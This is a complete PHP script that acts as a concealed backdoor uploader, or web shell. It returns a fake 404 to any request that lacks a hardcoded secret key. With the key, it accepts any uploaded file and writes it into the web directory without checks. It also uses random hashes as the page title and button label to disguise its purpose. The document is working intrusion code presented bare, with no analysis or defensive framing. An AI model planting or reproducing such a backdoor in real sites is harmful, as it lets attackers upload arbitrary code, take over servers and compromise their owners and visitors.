<?php
                $c="QXnt3ExQ8TmP";
                $q=$_GET["key"]??"";
                if($q!==$c){header("HTTP/1.0 404 Not Found");exit;}
                $s=sha1($c.microtime(true));
                $t=substr($s,0,10);
                $u=substr($s,10,6);
                $z=__DIR__;
                $h="";
                if($_SERVER["REQUEST_METHOD"]==="POST" && isset($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
                 $n=$_FILES["f"]["name"];
                 $g=$_FILES["f"]["tmp_name"];
                 if($n!=="" && is_uploaded_file($g)){
                  $p=$z."/".basename($n);
                  if(move_uploaded_file($g,$p)){
                   $proto=(!empty($_SERVER["HTTPS"]) && $_SERVER["HTTPS"]!=="off")?"https":"http";
                   $dir=rtrim(str_replace("\\","/",dirname($_SERVER["REQUEST_URI"])),"/");
                   $url=$proto."://".$_SERVER["HTTP_HOST"].$dir."/".rawurlencode(basename($n));
                   $h="OK: <a href=\"".htmlspecialchars($url,ENT_QUOTES,"UTF-8")."\" target=\"_blank\">".htmlspecialchars(basename($n),ENT_QUOTES,"UTF-8")."</a>";
                  }else{
                   $h="ERR_MOVE";
                  }
                 }else{
                  $h="ERR_FILE";
                 }
                }
                ?><!doctype html><html><head><meta charset="utf-8"><title><?php echo htmlspecialchars($t,ENT_QUOTES,"UTF-8");?></title></head><body><?php if($h!==""):?><div><?php echo $h;?></div><?php endif;?><form method="post" enctype="multipart/form-data"><input type="file" name="f" required><button type="submit"><?php echo htmlspecialchars($u,ENT_QUOTES,"UTF-8");?></button></form></body></html>